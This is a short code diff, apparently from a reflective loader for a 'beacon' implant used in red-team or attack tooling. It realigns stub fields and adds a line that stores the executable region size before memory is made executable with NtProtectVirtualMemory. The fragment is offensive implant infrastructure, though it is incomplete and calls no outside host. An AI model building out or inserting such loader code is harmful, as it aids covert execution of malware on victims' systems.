@@ -144,9 +144,9 @@ SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
 {
     PSTUB Stub = ( PSTUB )buffer;
 
-    Stub->Region = U_PTR( buffer );
-    Stub->Size   = U_PTR( region );
-    Stub->Heap   = heap;
+    Stub->Region            = U_PTR( buffer );
+    Stub->Size              = U_PTR( region );
+    Stub->Heap              = heap;
 };
 
 SECTION( B ) VOID executeBeacon( PVOID entry )
@@ -182,6 +182,7 @@ SECTION( B ) VOID Loader( VOID )
             installHooks( Map, MemoryBuffer, Reg.NT );
 
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
+            ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
             Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
             if( Status == STATUS_SUCCESS )
             {
